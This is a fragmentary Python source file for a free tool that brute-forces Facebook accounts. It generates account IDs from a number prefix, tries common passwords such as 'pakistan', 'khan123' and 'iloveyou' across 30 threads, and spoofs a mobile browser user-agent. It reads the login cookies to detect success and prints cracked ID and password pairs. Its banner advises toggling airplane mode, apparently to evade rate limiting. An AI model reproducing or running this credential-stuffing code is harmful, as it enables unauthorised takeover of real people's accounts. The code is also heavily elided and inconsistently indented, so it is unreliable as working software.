...
##     ## ##     ## ##     ##
===============================================   
\33[1;97m[+] CREATER  : ADIL TARIQ TOOR
\33[1;97m[+] VERSION  : 1.3.0
\33[1;97m[+] TOOL STATUS   : FREE
\33[1;92m===============================================   
\33[1;93mTurn on & off flight (airplane) mode before use :)   
========================================================"""
...
def AXA():
	...
	if me in ["2", "02"]:
		...
		AXA()
        if me in ["4", "04"]:
		os.system(f'xdg-open https://www.facebook.com/adiltoor27')
...
def bd():
                ...
                with tred(max_workers=30) as sat:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'pakistan','iloveyou','khan123','khan12','khan12345','pubgpubg']
                                sat.submit(apix,ids,passlist)
                print('\033[1;37mTHANKS FOR USING')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))


def CEA(cookies,access_token):
	global total
...
def rcrack_free(idf,pwv):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[141:156]
				print('\n')
				print('\033[1;93m[AXA-CP] '+idf+' | '+ps+'\033[0;97m')
